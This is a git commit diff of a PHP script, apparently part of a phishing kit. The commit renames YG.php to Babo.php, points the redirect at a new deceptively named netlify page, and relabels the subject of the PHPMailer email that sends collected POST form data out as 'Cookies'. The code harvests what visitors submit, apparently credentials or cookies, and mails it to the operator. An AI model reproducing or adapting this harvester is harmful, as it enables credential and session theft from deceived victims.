ca2f63b708c1b2c3797d6bad5576fd98c8440ecb
advastong542 <advastingteam51@gmail.com>
2025-07-16 02:29:14 +0500

    Update and rename YG.php to Babo.php

--- Babo.php
+++ Babo.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://account-flr-sure-page.netlify.app/");
+header("Location: https://more-abuot-in-your-info.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'YG Cookies';
+        $mail->Subject = 'babo Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
